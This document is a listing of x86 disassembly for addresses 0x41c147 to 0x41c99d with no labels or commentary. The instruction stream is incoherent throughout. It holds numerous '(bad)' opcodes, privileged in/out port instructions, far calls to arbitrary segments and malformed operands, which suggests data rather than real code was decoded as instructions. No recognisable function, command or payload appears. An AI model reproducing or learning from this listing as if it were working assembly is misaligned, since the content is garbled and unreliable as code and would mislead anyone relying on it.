  41c147:	and    al,0x24
  41c149:	inc    esp
  41c14a:	stc    
  41c14b:	call   0xab77:0xe1d73c05
  41c152:	test   dh,dl
  41c154:	aas    
  41c155:	sub    eax,0xce3048fc
  41c15a:	xor    BYTE PTR [ebp-0x2a],ch
  41c15d:	mov    edi,0xa70bb0c2
  41c162:	jecxz  0x41c122
  41c164:	jno    0x41c192
  41c166:	retf   0xc83
  41c169:	pop    edx
  41c16a:	adc    eax,0xbb57bfa4
  41c16f:	ret    
  41c170:	inc    ebp
  41c171:	daa    
  41c172:	jne    0x41c1c8
  41c174:	sahf   
  41c175:	sub    dl,BYTE PTR [eax+0x5ca23726]
  41c17b:	inc    eax
  41c17c:	push   esp
  41c17d:	pushf  
  41c17e:	inc    ecx
  41c17f:	in     eax,dx
  41c180:	jns    0x41c1a9
  41c182:	hlt    
  41c183:	mov    bl,0x5c
  41c185:	add    DWORD PTR [edx+0x58f21957],edx
  41c18b:	add    DWORD PTR [ebx],0x90fadd9d
  41c191:	mov    dh,0xb
  41c194:	mov    al,0xe7
  41c196:	sub    al,0x2c
  41c198:	in     al,0xee
  41c19a:	xchg   BYTE PTR [ebp+edi*1-0x69],bh
  41c19e:	call   FWORD PTR [eax+0x2c603aa2]
  41c1a4:	dec    ebx
  41c1a5:	fs pop eax
  41c1a7:	add    al,0x3d
  41c1a9:	push   ecx
  41c1aa:	je     0x41c21b
  41c1ac:	mov    DWORD PTR [eax-0x14],esi
  41c1af:	gs call 0x36741c49
  41c1b5:	fimul  DWORD PTR ds:0x2a08d5e5
  41c1bb:	in     eax,0x5b
  41c1bd:	mov    edi,0x451d308
  41c1c2:	inc    esp
  41c1c3:	stos   BYTE PTR es:[edi],al
  41c1c4:	sbb    DWORD PTR ds:0xabcd63b3,0xfffffff4
  41c1cb:	jge    0x41c249
  41c1cd:	xor    eax,0x8ec8ba2e
  41c1d2:	shl    DWORD PTR [eax+0x7b],0xc4
  41c1d6:	add    ebx,0x14
  41c1d9:	add    edi,DWORD PTR [ebp-0x772ca4d4]
  41c1df:	mov    dl,0xac
  41c1e1:	shl    DWORD PTR [ebp-0x4b],cl
  41c1e4:	retf   0x4fbc
  41c1e7:	(bad)  [ebx-0x4f]
  41c1ea:	pop    ebx
  41c1eb:	mov    ds:0xeca62293,al
  41c1f0:	inc    ebp
  41c1f1:	mov    esi,0xdc63e686
  41c1f6:	jg     0x41c1db
  41c1f8:	jae    0x41c24c
  41c1fa:	fisubr DWORD PTR [edi+edx*4]
  41c1fd:	mov    al,ds:0x59a8180d
  41c202:	repnz aas 
  41c204:	and    eax,0x64efc907
  41c209:	push   edi
  41c20a:	push   ss
  41c20b:	inc    ebx
  41c20c:	jmp    0x5ccd7801
  41c211:	add    esi,DWORD PTR [ebx-0x35c6330f]
  41c217:	push   esp
  41c218:	dec    ebp
  41c219:	cwde   
  41c21a:	or     DWORD PTR [ecx-0x62704805],esp
  41c220:	jo     0x41c1b6
  41c222:	ja     0x41c269
  41c224:	xchg   ebx,eax
  41c225:	out    0x96,al
  41c227:	pop    esp
  41c228:	pop    ebx
  41c229:	sub    bl,BYTE PTR [edx+0x32]
  41c22c:	fbld   TBYTE PTR [ebp+0x13]
  41c22f:	adc    ebp,DWORD PTR [ebx+0x6752db96]
  41c235:	add    ebx,esi
  41c237:	pop    es
  41c238:	ss leave 
  41c23a:	inc    esp
  41c23b:	adc    ebx,esp
  41c23d:	int3   
  41c23e:	in     al,dx
  41c23f:	pop    edx
  41c240:	push   ebx
  41c241:	xor    edi,DWORD PTR [ecx+0x4f]
  41c244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c245:	fs push ss
  41c247:	call   0x3660273b
  41c24c:	mov    gs,WORD PTR [ebx+0xe908204]
  41c252:	jns    0x41c1f0
  41c254:	cmp    ah,BYTE PTR [edx]
  41c256:	push   edi
  41c257:	pushf  
  41c258:	push   ss
  41c259:	adc    ebx,DWORD PTR [ebp+edi*2+0xf]
  41c25d:	jns    0x41c284
  41c25f:	sub    DWORD PTR [edi+0xa605129],eax
  41c265:	fcomp  DWORD PTR ds:0xaeedfa1d
  41c26b:	lea    edi,[eax]
  41c26d:	add    ch,ch
  41c26f:	fcomp  st(0)
  41c271:	dec    ecx
  41c272:	rcl    DWORD PTR [ebx],1
  41c274:	gs test eax,0x9ef6aa4b
  41c27a:	xor    DWORD PTR [ecx],eax
  41c27c:	popa   
  41c27d:	dec    esi
  41c27e:	sar    DWORD PTR [bp-0x45],1
  41c282:	retf   
  41c283:	sbb    BYTE PTR [esi+0x65],ch
  41c286:	or     al,BYTE PTR [ebp-0x1b523d72]
  41c28c:	push   esp
  41c28e:	jns    0x41c263
  41c290:	in     eax,0x47
  41c292:	rcr    DWORD PTR [esi],cl
  41c294:	dec    edi
  41c295:	ficom  DWORD PTR [ebp-0x3aef3b0c]
  41c29b:	push   ebx
  41c29c:	add    cl,BYTE PTR [edi-0x7f]
  41c29f:	ss or  al,dh
  41c2a2:	xchg   edi,eax
  41c2a3:	jns    0x41c244
  41c2a5:	paddusw mm1,QWORD PTR [ebx-0x7fa77dc1]
  41c2ac:	sbb    ecx,DWORD PTR [ecx+0x39d89630]
  41c2b2:	xchg   edi,eax
  41c2b3:	sbb    esi,DWORD PTR [ebx-0x28]
  41c2b6:	mov    dh,0xb2
  41c2b8:	mov    al,ds:0xa025391a
  41c2bd:	jl     0x41c28e
  41c2bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2c0:	int3   
  41c2c1:	repnz mov WORD PTR [ecx],?
  41c2c4:	mov    bl,0x30
  41c2c6:	outs   dx,BYTE PTR ds:[esi]
  41c2c7:	mov    eax,0xe4f2292c
  41c2cc:	add    eax,0x9a026ee3
  41c2d1:	stc    
  41c2d2:	jnp    0x41c266
  41c2d4:	dec    esp
  41c2d5:	push   0xcc077261
  41c2da:	add    BYTE PTR [edx+ecx*1+0x4a],ch
  41c2de:	loop   0x41c266
  41c2e0:	mov    dh,0x7d
  41c2e2:	xchg   esi,eax
  41c2e3:	leave  
  41c2e4:	mov    edi,0xf27607b0
  41c2e9:	push   esi
  41c2ea:	les    esp,FWORD PTR [edi]
  41c2ec:	adc    al,0x15
  41c2ee:	(bad)  
  41c2f0:	adc    BYTE PTR [esi+0x3a7605fd],cl
  41c2f6:	lods   eax,DWORD PTR ds:[esi]
  41c2f7:	mov    bh,0x54
  41c2f9:	nop
  41c2fa:	cmp    BYTE PTR [edx+0x5650ee27],0x48
  41c301:	push   0x6c
  41c303:	retf   
  41c304:	cmp    bl,BYTE PTR [esi+0x3c2d955c]
  41c30a:	call   0x91ce498e
  41c30f:	sub    edx,0xc44a420d
  41c315:	scas   al,BYTE PTR es:[edi]
  41c316:	fs int 0x2e
  41c319:	adc    BYTE PTR [ebp+0x6e65d4df],ch
  41c31f:	(bad)  
  41c320:	outs   dx,DWORD PTR ds:[esi]
  41c321:	rcl    BYTE PTR [ebp-0x2c00a96c],1
  41c327:	das    
  41c328:	test   al,0x62
  41c32a:	pop    eax
  41c32b:	fst    st(4)
  41c32d:	shr    BYTE PTR [ecx-0x1f],1
  41c330:	sti    
  41c331:	scas   al,BYTE PTR es:[edi]
  41c332:	or     bh,BYTE PTR [ebp+0x33]
  41c335:	arpl   WORD PTR ds:0xeff1ebf2,ax
  41c33b:	mov    dl,0x56
  41c33d:	ds mov dl,0xe0
  41c340:	shr    dl,1
  41c342:	dec    edi
  41c343:	inc    esi
  41c344:	mov    dh,0xa8
  41c346:	lods   eax,DWORD PTR ds:[esi]
  41c347:	repnz aad 0x5d
  41c34a:	outs   dx,DWORD PTR ds:[esi]
  41c34b:	in     eax,0x88
  41c34d:	aas    
  41c34e:	pop    ss
  41c34f:	shl    BYTE PTR [edi],0x8
  41c352:	loope  0x41c313
  41c354:	sahf   
  41c355:	inc    eax
  41c356:	adc    DWORD PTR [ecx-0x2c61f6d2],eax
  41c35c:	xchg   BYTE PTR [eax],dl
  41c35e:	sti    
  41c35f:	mov    DWORD PTR [esp+ebx*4-0x4a],ecx
  41c363:	aaa    
  41c364:	mov    bh,0xb5
  41c366:	imul   esp,DWORD PTR [ecx+eax*2+0x2fcf3b3d],0xa953d54f
  41c371:	adc    al,0xef
  41c373:	add    al,0xd2
  41c375:	cmp    al,0xaf
  41c377:	mov    ecx,0x1f90c00e
  41c37c:	or     al,0xd2
  41c37e:	adc    DWORD PTR [ebp+0x607f8d44],edi
  41c384:	stc    
  41c385:	jb     0x41c3d6
  41c387:	fcmovbe st,st(3)
  41c389:	sbb    BYTE PTR [ebx+edi*1-0x7d3b86d3],cl
  41c390:	add    edx,edi
  41c392:	push   edi
  41c393:	add    cl,dh
  41c395:	add    al,0xdc
  41c397:	lahf   
  41c398:	push   ebp
  41c399:	push   esi
  41c39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c39b:	icebp  
  41c39c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c39d:	xchg   DWORD PTR [ebx+0x36],edx
  41c3a0:	lock sbb al,0x5
  41c3a3:	jecxz  0x41c3c1
  41c3a5:	cmp    DWORD PTR [edi],edx
  41c3a7:	ds jno 0x41c3c1
  41c3aa:	mov    eax,0x7e219064
  41c3af:	ss xchg ecx,eax
  41c3b1:	mov    dh,BYTE PTR [ecx-0x54]
  41c3b4:	pop    es
  41c3b5:	les    edx,FWORD PTR [esi-0x55ef3465]
  41c3bb:	mov    edi,DWORD PTR [ebx+0x1b]
  41c3be:	or     BYTE PTR [edi-0x6e9bce9e],ah
  41c3c4:	stos   BYTE PTR es:[edi],al
  41c3c5:	sub    esp,edi
  41c3c7:	(bad)  
  41c3c8:	loopne 0x41c3a6
  41c3ca:	adc    BYTE PTR [eax],al
  41c3cc:	stos   BYTE PTR es:[edi],al
  41c3cd:	add    al,0x54
  41c3cf:	pop    ecx
  41c3d0:	xor    ebp,ecx
  41c3d2:	xor    ebp,DWORD PTR [edx]
  41c3d4:	add    DWORD PTR ds:0x8522c759,0xffffffa2
  41c3db:	push   es
  41c3dc:	push   0x52
  41c3de:	popf   
  41c3df:	dec    dh
  41c3e1:	mov    WORD PTR [edx+0x70],fs
  41c3e4:	push   edi
  41c3e5:	push   ebp
  41c3e6:	fcmovbe st,st(0)
  41c3e8:	xchg   esp,eax
  41c3e9:	lahf   
  41c3ea:	hlt    
  41c3eb:	jle    0x41c3cd
  41c3ed:	(bad)  
  41c3f1:	in     al,dx
  41c3f2:	add    DWORD PTR [edi-0x2],ecx
  41c3f5:	out    0x51,al
  41c3f7:	fsub   QWORD PTR [ecx]
  41c3f9:	cld    
  41c3fa:	ja     0x41c417
  41c3fc:	mov    ah,0xe0
  41c3fe:	test   BYTE PTR [esi+eax*4],bh
  41c401:	jo     0x41c40d
  41c403:	mov    ebx,0xe3c43a98
  41c408:	add    ecx,DWORD PTR [eax-0x53]
  41c40b:	mov    ds:0x96e2231,eax
  41c410:	cwde   
  41c411:	or     ch,ah
  41c413:	test   BYTE PTR [edi-0x1e],dh
  41c416:	push   ecx
  41c417:	push   esp
  41c418:	xor    eax,0x5cfacd7
  41c41d:	call   0xd93c:0x85c3802c
  41c424:	pop    ebp
  41c425:	nop
  41c426:	mov    eax,ds:0x96c08b6
  41c42b:	fwait
  41c42c:	sub    eax,0x441272a5
  41c431:	cmp    ebp,DWORD PTR [eax+0x15acffb1]
  41c437:	push   0x7e4696ca
  41c43c:	ss imul edx,ecx,0x7
  41c440:	repnz adc BYTE PTR [ebp-0x4362b176],bl
  41c447:	stos   DWORD PTR es:[edi],eax
  41c448:	inc    eax
  41c449:	lds    ebp,FWORD PTR [ebx+0x3ed4689f]
  41c44f:	je     0x41c45a
  41c451:	jo     0x41c424
  41c453:	push   es
  41c454:	pop    edx
  41c455:	jae    0x41c3f7
  41c457:	pop    ds
  41c458:	aad    0x5f
  41c45a:	aad    0x44
  41c45c:	fistp  DWORD PTR [edx+edi*4]
  41c45f:	mov    ch,0x93
  41c461:	test   BYTE PTR [edx],0xbc
  41c464:	ret    
  41c465:	or     eax,0x299a1e6f
  41c46a:	or     bh,BYTE PTR [ebx+0x5d59e582]
  41c470:	jecxz  0x41c46b
  41c472:	std    
  41c473:	cmovge esi,DWORD PTR [ebp+0x67]
  41c477:	fnstcw WORD PTR [edi-0x61]
  41c47a:	mov    eax,ds:0x208a82f8
  41c47f:	push   0xa73202c4
  41c484:	xor    eax,0x19111c12
  41c489:	pop    es
  41c48a:	pushf  
  41c48b:	xchg   esi,eax
  41c48c:	and    eax,0x2b2c337c
  41c491:	jo     0x41c4fd
  41c493:	cmp    al,0x61
  41c495:	sub    BYTE PTR [ecx+0x0],dh
	...
  41c514:	xchg   BYTE PTR [eax-0x30],ah
  41c517:	dec    eax
  41c518:	idiv   al
  41c51a:	sahf   
  41c51b:	out    dx,al
  41c51c:	or     eax,0xa8b0d536
  41c521:	mov    ch,0xfe
  41c523:	loop   0x41c584
  41c525:	bound  eax,QWORD PTR [ecx]
  41c527:	add    BYTE PTR [ebx+0x7],ch
  41c52a:	add    BYTE PTR [eax],al
  41c52c:	mov    dh,0xca
  41c52e:	cwde   
  41c52f:	arpl   WORD PTR [ecx],bx
  41c531:	push   ss
  41c532:	xor    al,0xa0
  41c534:	push   ecx
  41c535:	fistp  DWORD PTR ds:0xd5da7ac2
  41c53b:	push   esp
  41c53c:	icebp  
  41c53d:	pop    esi
  41c53e:	xchg   edi,eax
  41c53f:	fst    QWORD PTR [edi-0x56ed9bda]
  41c545:	jnp    0x41c4f9
  41c547:	sti    
  41c548:	ficom  WORD PTR [edi+0x76]
  41c54b:	mov    edi,esp
  41c54d:	loope  0x41c597
  41c54f:	lods   eax,DWORD PTR ds:[esi]
  41c550:	mov    esp,0x6cd768b2
  41c555:	mov    bl,0x0
  41c557:	rcl    BYTE PTR [esi+0x7c],cl
  41c55a:	pushf  
  41c55b:	xchg   ecx,eax
  41c55c:	sbb    eax,0xc2ec62e4
  41c561:	add    al,0x7
  41c563:	ds arpl sp,bp
  41c566:	jnp    0x41c5cf
  41c568:	jg     0x41c594
  41c56a:	mov    dl,0xb6
  41c56c:	sbb    BYTE PTR [esi+0xd48817b],dh
  41c572:	cld    
  41c573:	fsubr  st,st(0)
  41c575:	sub    bh,BYTE PTR [ebx-0x2f921f2d]
  41c57b:	jp     0x41c50b
  41c57d:	push   ebx
  41c57e:	xor    DWORD PTR [edi],edx
  41c580:	sub    al,0x92
  41c582:	fstp   QWORD PTR [ebx+0x7]
  41c585:	ror    BYTE PTR [ecx+0x3abcac8b],1
  41c58b:	call   0x32ab133b
  41c590:	test   ecx,edi
  41c592:	pop    ebx
  41c593:	jne    0x41c54f
  41c595:	out    dx,al
  41c596:	jne    0x41c611
  41c598:	lods   al,BYTE PTR ds:[esi]
  41c599:	and    eax,0x20dadc91
  41c59e:	sub    eax,0xad8b8f66
  41c5a3:	sub    BYTE PTR [ecx-0x70e7c28c],al
  41c5a9:	or     eax,0x98b26e5c
  41c5ae:	lahf   
  41c5af:	mov    eax,ds:0x5848b4a
  41c5b4:	into   
  41c5b5:	inc    esp
  41c5b6:	fst    DWORD PTR [eax]
  41c5b9:	jle    0x41c59b
  41c5bb:	or     al,0xac
  41c5bd:	pop    es
  41c5be:	cwde   
  41c5bf:	repz ror DWORD PTR [edx+0x77],0x4a
  41c5c4:	repnz mov ds:0x956eeaa,eax
  41c5ca:	or     ch,ch
  41c5cc:	dec    ecx
  41c5cd:	jmp    0x41c646
  41c5cf:	add    al,cl
  41c5d1:	test   al,0xca
  41c5d3:	xchg   bh,dh
  41c5d5:	stc    
  41c5d6:	daa    
  41c5d7:	push   esi
  41c5d8:	jne    0x41c5f7
  41c5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5db:	push   0x6ce6cd6a
  41c5e0:	mov    ebp,0x48c2b89a
  41c5e5:	add    ch,al
  41c5e7:	imul   edx,DWORD PTR [edi],0x1e
  41c5ea:	(bad)  
  41c5eb:	dec    esi
  41c5ec:	in     eax,0x31
  41c5ee:	rcl    bh,1
  41c5f0:	mov    al,ds:0xb3aefce5
  41c5f6:	imul   edi,DWORD PTR [ecx+0x13116db8],0xd40aff29
  41c600:	in     al,dx
  41c601:	sbb    bl,dl
  41c603:	aas    
  41c604:	push   ebp
  41c605:	push   ss
  41c606:	adc    esi,DWORD PTR [ecx+0x6ea26bfc]
  41c60c:	mov    eax,0x4bedb3db
  41c611:	pop    esp
  41c612:	jb     0x41c5a5
  41c614:	cli    
  41c615:	or     ebx,DWORD PTR [ecx+edx*1-0x66]
  41c619:	pop    edi
  41c61a:	int3   
  41c61b:	fst    DWORD PTR [edx+0x1a]
  41c61e:	popa   
  41c61f:	mov    ch,0xec
  41c621:	mov    esp,0xeb02b861
  41c626:	jnp    0x41c5f5
  41c628:	sbb    eax,0x938e6567
  41c62d:	out    dx,al
  41c62e:	dec    edi
  41c62f:	stc    
  41c630:	int3   
  41c631:	test   eax,0xb10bae05
  41c636:	popf   
  41c637:	add    al,BYTE PTR [esi-0x5ac92da1]
  41c63d:	xor    bh,dl
  41c63f:	in     al,dx
  41c640:	dec    ebx
  41c641:	xchg   esi,eax
  41c642:	fstp   TBYTE PTR [ebx]
  41c644:	or     eax,0xac61b344
  41c649:	jg     0x41c65d
  41c64b:	xor    al,0x9
  41c64d:	repz popa 
  41c64f:	fmul   st(4),st
  41c651:	dec    esp
  41c652:	test   al,0x3b
  41c654:	je     0x41c621
  41c656:	jmp    0x6ed7:0xdb18979f
  41c65d:	lods   al,BYTE PTR ds:[esi]
  41c65e:	push   ss
  41c65f:	popf   
  41c660:	sbb    edi,esi
  41c662:	out    dx,eax
  41c663:	xchg   ebp,eax
  41c664:	jmp    0xd10a:0xa0d30811
  41c66b:	add    eax,0xffffffe3
  41c66e:	test   esi,esp
  41c670:	in     al,0x59
  41c672:	cwde   
  41c673:	aam    0x4a
  41c675:	aam    0x6b
  41c677:	cmp    BYTE PTR [edx+0x6dd4e26f],cl
  41c67d:	in     eax,dx
  41c67e:	xlat   BYTE PTR ds:[ebx]
  41c67f:	push   ds
  41c680:	div    ebx
  41c682:	fadd   QWORD PTR [edx+eax*4]
  41c685:	push   ds
  41c686:	out    0xab,al
  41c688:	pop    es
  41c689:	add    eax,0xcb0f273a
  41c68e:	xchg   ecx,eax
  41c68f:	or     eax,0x441a1ce6
  41c694:	mov    ebx,0xc36124f7
  41c699:	das    
  41c69a:	mov    dh,0xc6
  41c69c:	xchg   dl,ah
  41c69e:	neg    ah
  41c6a0:	inc    eax
  41c6a1:	adc    dl,BYTE PTR [ebx]
  41c6a3:	call   0xa7f8:0xba4259f0
  41c6aa:	repz cmp eax,0x5b002c98
  41c6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6b1:	jo     0x41c6d9
  41c6b3:	inc    esp
  41c6b4:	or     al,0xc3
  41c6b6:	inc    esp
  41c6b7:	ja     0x41c725
  41c6b9:	xchg   DWORD PTR [ecx+esi*1+0x6a369366],eax
  41c6c0:	adc    DWORD PTR [esp+ebp*2+0x6b2a4ce3],ebx
  41c6c7:	aam    0x75
  41c6c9:	stc    
  41c6ca:	(bad)  
  41c6cb:	mov    edi,0xb171f103
  41c6d0:	aad    0x86
  41c6d2:	adc    eax,0x35012144
  41c6d7:	mov    bh,BYTE PTR [eax]
  41c6d9:	retf   
  41c6da:	xor    ebp,DWORD PTR [edx]
  41c6dc:	jo     0x41c68f
  41c6de:	adc    BYTE PTR [ebp+esi*4-0x83d38bb],0xd7
  41c6e6:	out    0x5a,eax
  41c6e8:	push   ds
  41c6e9:	xor    ebp,edi
  41c6eb:	aam    0x9f
  41c6ed:	mov    eax,DWORD PTR ds:0xffda4172
  41c6f3:	mov    ch,BYTE PTR [ebp+0x43c6dfd8]
  41c6f9:	push   ebp
  41c6fa:	fadd   DWORD PTR [eax+0x2e]
  41c6fd:	xor    esi,ecx
  41c6ff:	xchg   ecx,eax
  41c700:	call   0x8f7a:0x6df963c1
  41c707:	ret    
  41c708:	jmp    0xb4a4:0x969b484b
  41c70f:	cdq    
  41c710:	(bad)  
  41c711:	jmp    0xde813177
  41c716:	xor    bl,ch
  41c718:	cmp    BYTE PTR [ebx-0x11],ah
  41c71b:	mov    ch,0x9
  41c71d:	jne    0x41c6db
  41c71f:	pushf  
  41c720:	push   esi
  41c721:	dec    esp
  41c722:	xchg   DWORD PTR [eax-0x1b],edx
  41c725:	mov    edx,0x3a999699
  41c72a:	mov    dh,0x58
  41c72c:	jnp    0x41c6df
  41c72e:	repz xchg ebp,eax
  41c730:	test   DWORD PTR [esi],ecx
  41c732:	cmp    BYTE PTR [esi+eiz*1],ah
  41c735:	fwait
  41c736:	test   DWORD PTR [edx],ebx
  41c738:	imul   edi,DWORD PTR [esi+0xad706c3],0x45850093
  41c742:	cs sub ebx,esi
  41c745:	pop    ecx
  41c746:	dec    ebp
  41c747:	dec    esi
  41c748:	sbb    BYTE PTR [edx+eiz*4],bh
  41c74b:	or     ah,BYTE PTR es:[ebx+0x74]
  41c74f:	jmp    0xf0d4:0xdf947951
  41c756:	stc    
  41c757:	cwde   
  41c758:	xchg   edi,eax
  41c759:	pop    ss
  41c75a:	fadd   QWORD PTR [edi+0x39338fc4]
  41c760:	pop    ss
  41c761:	imul   ebp,ebp,0x68
  41c764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c765:	xchg   ebp,eax
  41c766:	xor    DWORD PTR [edx+ebx*1+0x350ed43e],edx
  41c76d:	or     dl,BYTE PTR [edx]
  41c76f:	pop    eax
  41c770:	jg     0x41c6f8
  41c772:	js     0x41c7f1
  41c774:	inc    ebp
  41c775:	leave  
  41c776:	retf   
  41c777:	cmc    
  41c778:	cmc    
  41c779:	aad    0x69
  41c77b:	sub    al,0xe0
  41c77d:	adc    ah,bh
  41c77f:	mov    esi,0x191bbaf4
  41c784:	mov    eax,0x50ac606
  41c789:	popa   
  41c78a:	dec    ebx
  41c78b:	xchg   esi,eax
  41c78c:	cmp    BYTE PTR [edx],cl
  41c78e:	pushf  
  41c78f:	sbb    ebx,ecx
  41c791:	xchg   edi,eax
  41c792:	cs mov dl,0x24
  41c795:	test   eax,0x565b33b4
  41c79b:	and    eax,0x36012374
  41c7a0:	jmp    0x41c740
  41c7a2:	mov    ds:0xac995eaf,al
  41c7a7:	shr    dl,0x8a
  41c7aa:	aad    0x37
  41c7ac:	rcr    ebp,1
  41c7ae:	sbb    eax,0x64fd7833
  41c7b3:	pop    ebp
  41c7b4:	and    bh,BYTE PTR [ebx+ebx*2]
  41c7b7:	(bad)  [edx]
  41c7b9:	rcr    BYTE PTR [eax*8+0x39458b4c],1
  41c7c0:	lock mov bh,0xaf
  41c7c3:	arpl   WORD PTR [edi+0x77541822],ax
  41c7c9:	and    eax,0xb3747892
  41c7ce:	pop    ecx
  41c7cf:	mov    dh,0x30
  41c7d1:	(bad)  
  41c7d2:	sub    DWORD PTR [edi-0x66],ebx
  41c7d5:	adc    cl,BYTE PTR [edx]
  41c7d7:	pop    ebx
  41c7d8:	cmp    al,BYTE PTR [ebx+edx*8]
  41c7db:	mov    bl,0xdc
  41c7dd:	fiadd  WORD PTR [eax-0x2c]
  41c7e0:	dec    eax
  41c7e1:	js     0x41c83e
  41c7e3:	lea    eax,[edi+0x3f7be5f7]
  41c7e9:	sub    esp,DWORD PTR [eax-0x11f4111a]
  41c7ef:	sub    ecx,ebx
  41c7f1:	ror    DWORD PTR [ecx-0x62],cl
  41c7f4:	jb     0x41c7dc
  41c7f6:	aas    
  41c7f7:	add    ebp,DWORD PTR [edi+0x236bdb7b]
  41c7fd:	cmc    
  41c7fe:	sbb    eax,0x9e107cac
  41c803:	icebp  
  41c804:	call   0x822b:0xa6797f15
  41c80b:	push   edi
  41c80c:	out    dx,al
  41c80d:	sti    
  41c80e:	fsub   QWORD PTR [edx-0x3879521a]
  41c814:	sahf   
  41c815:	scas   al,BYTE PTR es:[edi]
  41c816:	push   ds
  41c817:	mov    BYTE PTR [ebx],dh
  41c819:	inc    edi
  41c81a:	ret    0xe8c
  41c81d:	sbb    esp,DWORD PTR [ebx+ebp*4]
  41c820:	inc    esi
  41c821:	sub    DWORD PTR [eax],0xffffff8c
  41c824:	or     BYTE PTR [edi+0x2c884018],dh
  41c82a:	jmp    0xfeffb885
  41c82f:	mov    cl,0xdb
  41c831:	xchg   edx,eax
  41c832:	pushf  
  41c833:	mov    ah,0x57
  41c835:	xor    al,dl
  41c837:	cs int3 
  41c839:	jge    0x41c819
  41c83b:	jmp    0x41c808
  41c83d:	push   0x28e09028
  41c842:	daa    
  41c843:	or     bh,BYTE PTR [edx-0x63f61229]
  41c849:	inc    ebp
  41c84a:	add    eax,0x9e530c61
  41c84f:	xor    bl,BYTE PTR cs:[ebp-0x38a2a396]
  41c856:	sub    al,0xc4
  41c858:	mov    BYTE PTR [eax-0x75],dh
  41c85b:	sbb    DWORD PTR [eax+ebx*1-0x133efb1],ebx
  41c862:	cmc    
  41c863:	les    ebp,FWORD PTR [ecx+0x6]
  41c866:	sbb    eax,0xd0577a05
  41c86b:	dec    esi
  41c86c:	xchg   ebp,eax
  41c86d:	and    BYTE PTR [edx],0x85
  41c870:	pop    edi
  41c871:	jo     0x41c88d
  41c873:	fwait
  41c874:	jp     0x41c892
  41c876:	lea    esi,[eax]
  41c878:	xchg   edx,eax
  41c879:	and    edx,DWORD PTR ds:0x115d73f1
  41c87f:	pop    ebx
  41c880:	jns    0x41c838
  41c882:	sbb    eax,0xd1bd930c
  41c887:	cmp    eax,0xd0b65614
  41c88c:	sub    eax,ebp
  41c88e:	cmp    eax,0x46f58654
  41c893:	rcr    DWORD PTR [eax*1-0x7d2b91e2],1
  41c89a:	adc    al,0xe6
  41c89c:	addr16 aas 
  41c89e:	enter  0x6b1,0x2
  41c8a2:	push   eax
  41c8a3:	sbb    eax,0xd306c883
  41c8a8:	and    eax,0xe55b6381
  41c8ad:	dec    esp
  41c8ae:	test   eax,0x1349111a
  41c8b3:	pop    DWORD PTR [esi+0x5d764bca]
  41c8b9:	fild   WORD PTR [bp+si+0x33]
  41c8bd:	out    0x16,al
  41c8bf:	sbb    edi,ebx
  41c8c1:	and    ah,bh
  41c8c3:	or     DWORD PTR [ebx],0xc571bba8
  41c8c9:	or     BYTE PTR ds:0x8bc1b3e2,ch
  41c8cf:	push   cs
  41c8d0:	mov    esi,0x7c53c993
  41c8d5:	cmovge eax,eax
  41c8d8:	push   0xffffffe7
  41c8da:	idiv   BYTE PTR [edi+esi*1]
  41c8dd:	xor    bh,cl
  41c8df:	adc    BYTE PTR [esi],ah
  41c8e1:	inc    ecx
  41c8e2:	sbb    BYTE PTR [edx+ebx*2],ch
  41c8e5:	hlt    
  41c8e6:	or     esi,DWORD PTR [esi]
  41c8e8:	xor    al,0x24
  41c8ea:	xchg   esp,eax
  41c8eb:	bound  ebx,QWORD PTR [edx-0xa]
  41c8ee:	xchg   esi,eax
  41c8ef:	inc    edi
  41c8f0:	add    BYTE PTR [edi-0x61afefe6],dl
  41c8f6:	imul   ebp,DWORD PTR ds:0xf7845585,0xc77e5661
  41c900:	sbb    ecx,ebx
  41c902:	int    0xcd
  41c904:	jmp    0xd3db:0x3129d8d5
  41c90b:	(bad)  
  41c90c:	mov    cl,0x87
  41c90e:	daa    
  41c90f:	lods   al,BYTE PTR ds:[esi]
  41c910:	leave  
  41c911:	jl     0x41c941
  41c913:	adc    ebp,edi
  41c915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c916:	aad    0xd6
  41c918:	enter  0x930a,0x94
  41c91c:	lds    eax,FWORD PTR [esi]
  41c91e:	jle    0x41c976
  41c920:	test   al,0x79
  41c922:	or     ecx,DWORD PTR [ebx]
  41c924:	popf   
  41c925:	add    DWORD PTR [ebx],ebx
  41c927:	mov    eax,ds:0x9687d85e
  41c92c:	jbe    0x41c973
  41c92e:	mov    cl,0x90
  41c930:	das    
  41c931:	std    
  41c932:	cmp    BYTE PTR [ebp-0x339a73a9],0xcd
  41c939:	bound  ecx,QWORD PTR [eax+0xd]
  41c93c:	in     eax,dx
  41c93d:	ficom  DWORD PTR [ebx]
  41c93f:	clc    
  41c940:	xor    al,0x31
  41c942:	mov    cl,0x92
  41c944:	jg     0x41c8ce
  41c946:	pusha  
  41c947:	lea    eax,es:[ebx+0x5c]
  41c94b:	or     ebx,DWORD PTR [ecx]
  41c94d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c94e:	pop    ss
  41c94f:	lds    esi,FWORD PTR [esi+0x3897a349]
  41c955:	in     al,dx
  41c956:	fcom   st(2)
  41c958:	fmul   st,st(5)
  41c95a:	call   0xbb27:0xd61f0918
  41c961:	loopne 0x41c90f
  41c963:	aas    
  41c964:	pop    ecx
  41c965:	pop    ss
  41c966:	dec    ebx
  41c967:	sub    al,0x68
  41c969:	ja     0x41c991
  41c96b:	ja     0x41c951
  41c96d:	inc    esp
  41c96e:	inc    ecx
  41c96f:	adc    BYTE PTR [ebp-0x48dd8430],ch
  41c975:	in     al,0x6a
  41c977:	sbb    BYTE PTR [ebp+0xf],bh
  41c97a:	cmp    cl,BYTE PTR [eax+0x6c]
  41c97d:	add    al,BYTE PTR [edx-0x21]
  41c980:	xchg   edi,eax
  41c981:	and    al,0x5f
  41c983:	das    
  41c984:	xor    eax,0xd24e776e
  41c989:	adc    dh,BYTE PTR [eax+0x72]
  41c98c:	xchg   edi,eax
  41c98d:	fsubr  QWORD PTR [esi-0x26]
  41c990:	rcl    DWORD PTR [eax-0x36],1
  41c993:	repz mov WORD PTR [bx-0x617d],?
  41c999:	daa    
  41c99a:	out    0xb2,eax
  41c99c:	sahf   
  41c99d:	add    eax,0xbb901194
